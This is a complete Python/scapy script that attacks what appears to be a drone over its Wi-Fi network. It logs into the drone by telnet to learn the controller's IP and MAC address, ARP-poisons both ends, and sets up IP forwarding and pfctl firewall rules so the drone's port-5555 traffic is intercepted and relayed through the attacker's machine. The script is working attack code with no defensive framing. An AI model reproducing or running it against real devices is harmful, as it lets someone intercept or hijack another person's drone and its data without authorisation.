from scapy.all import *
import multiprocessing
import time
import os
import pexpect,sys
dev_ip = "192.168.1.3"
drone_ip = "192.168.1.1"
dev_macAddr = ""
drone_macAddr = ""
class MITM:
  def __init__(self,victim=(drone_ip,drone_macAddr ),node2=(dev_ip, dev_macAddr)):
    #determine my mac addr
    network=sys.argv[1]
    child=pexpect.spawn("ifconfig " + network)
    child.expect('ether (.*){17}')
    #define mac addr's and ip addr's
    self.myMac=child.after[6:]
    self.victim=victim
    self.node2=node2
    #Start arping
    multiprocessing.Process(target=self.arp_poison).start()
    #enable forwarding of non-port 5555 packets
    os.system("sudo sysctl -w net.inet.ip.forwarding=1")
    os.system("(sudo pfctl -sr 2>/dev/null; echo \"block drop quick on en1 proto tcp from port = 5555\") | sudo pfctl -f - 2>/dev/null")
    os.system("sudo pfctl -e")    
    sniff(filter='((dst %s) and (src %s) and (src port 5555))'%(self.node2[0], self.victim[0]),prn=lambda x:self.routep_drone(x), store=0)

  #handles packets going from DRONE TO ME
  def routep_drone(self,packet):
    if packet.haslayer(IP):
      packet[Ether].src = self.myMac
      packet[Ether].dst=self.node2[1]
      if packet.haslayer(TCP):
        del packet[TCP].chksum
        del packet[IP].len
        del packet[IP].chksum
        packet.show2()
        sendp(packet, iface="en1")
  def arp_poison(self):
    try:
      a=ARP()
      a.psrc=self.victim[0]
      a.pdst=self.node2[0]
      b=ARP()
      b.psrc=self.node2[0]
      b.pdst=self.victim[0]
      cond=True
      while cond:
        send(b)
        send(a)
        time.sleep(5)
    except:
      a=ARP()
      a.psrc=self.victim[0]
      a.pdst=self.node2[0]
      a.hwsrc=self.victim[1]
      b=ARP()
      b.psrc=self.node2[0]
      b.pdst=self.victim[0]
      b.hwsrc=self.node2[1]
      send(b)
      send(a)
      print "Exiting gracefully."
      os.system("sudo pfctl -d")
      os.system("sudo pfctl -f /etc/pf.conf")
      os.system("sudo sysctl -w net.inet.ip.forwarding=0")
      return    
if __name__=="__main__":
  if(len(sys.argv) != 2):
    print "Please enter the network you are on."
    sys.exit(1)
  child = pexpect.spawn('telnet 192.168.1.1')
  try:
    child.sendline('netstat')
    child.expect('192\.168\.1\..:5559(.*)ESTABLISHED')
    raw_line = child.after
    dev_ip = raw_line.split(' ')
    dev_ip = [i for i in dev_ip if i != '']
    dev_ip = dev_ip[1][:11]
  except:
    print "Error on dev ip routine, consider restarting"
  try:
    child.sendline('arp -a')
    child.expect(dev_ip + '\) at .{17}')
    dev_macAddr = child.after[-17:]
  except:
    print "Error on dev mac routine, consider restarting"
  try:
    child.sendline("ifconfig ath0")
    child.expect('HWaddr (.*){17}')
    drone_macAddr = child.after[7:24]
  except:
    print "Error on retrieving drone mac addr, consider restarting"
  mitm=MITM((drone_ip,drone_macAddr), (dev_ip, dev_macAddr))
